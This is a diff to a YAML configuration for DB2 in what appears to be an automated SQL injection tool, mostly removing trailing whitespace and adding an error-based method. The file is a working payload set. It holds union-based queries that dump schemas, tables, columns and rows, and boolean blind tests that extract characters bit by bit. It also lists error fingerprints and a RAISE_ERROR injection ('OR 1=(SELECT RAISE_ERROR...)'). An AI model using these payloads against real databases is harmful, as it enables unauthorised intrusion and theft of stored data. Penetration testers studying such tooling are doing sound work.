@@ -1,8 +1,8 @@
 vendor: DB2
 
-resource: 
+resource:
  info: |
-  select 
+  select
       versionnumber
       || '${enclose_value_sql}'
       || current server
@@ -10,8 +10,8 @@ resource:
       || user
       || '${trail_sql}'
   from sysibm.sysversions
-  
- schema: 
+
+ schema:
   database: |
    select varchar(
        LISTAGG(
@@ -23,7 +23,7 @@ resource:
    )
    from syscat.schemata
    ${limit}
-   
+
   table: |
    select varchar(
        LISTAGG(
@@ -33,10 +33,10 @@ resource:
        )
        || '${trail_sql}'
    )
-   from sysibm.systables 
+   from sysibm.systables
    where creator = '${database}'
    ${limit}
-   
+
   column: |
    select varchar(
        LISTAGG(
@@ -51,8 +51,8 @@ resource:
    and tbcreator = '${database}'
    and tbname = '${table}'
    ${limit}
-   
-  row: 
+
+  row:
    query: |
     /**
      * LISTAGG limit is 4000 and aggregate all data before limit is applied
@@ -71,21 +71,21 @@ resource:
         from ${database}.${table}
         ${limit}
     )
-   fields: 
+   fields:
     field: |
      trim(
          coalesce(
              varchar(
-                 ${field.value} 
+                 ${field.value}
                  || ''
-             ), 
+             ),
              ''
          )
      )
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    (
        select
@@ -106,20 +106,20 @@ strategy:
   failsafe: varchar('' || (1337${indice}7330%2b1), 1024)
   calibrator: |
    rpad(
-       '${calibrator_sql}', 
-       1024, 
+       '${calibrator_sql}',
+       1024,
        '${calibrator_sql}'
    )
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - function.db2
     - DB2 SQL Error
     - 'Warning: db2_execute()'
     - 'Warning: db2_fetch_array()'
-    
- normal: 
+
+ normal:
   indices: union select ${indices} from sysibm.sysdummy1
   capacity: |
    /**
@@ -128,17 +128,17 @@ strategy:
     */
    varchar('${lead}${indice}' || ${calibrator}, 1024)
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - 1 = 0
     - "'a' %21= 'a'"
     - "'b' %21= 'b'"
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - 0 = 0
     - "'a' %21= 'b'"
     - "'a' = 'a'"
@@ -150,14 +150,26 @@ strategy:
     0 != BITAND(
         ascii(
             substr(
-                ${injection}, 
-                ${window.char}, 
+                ${injection},
+                ${window.char},
                 1
             )
-        ), 
+        ),
         ${bit}
     )
    length: length(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
+  
+ error:
+  method:
+  
+   # RAISE_ERROR() interpreted whatever :OR :AND
+   - name: RAISE_ERROR
+     query: |
+      OR 1=(SELECT RAISE_ERROR('70001',(
+          ${window}
+      ))FROM SYSIBM.SYSDUMMY1)
+     # TODO Add to SQLEngine
+     capacity: 70
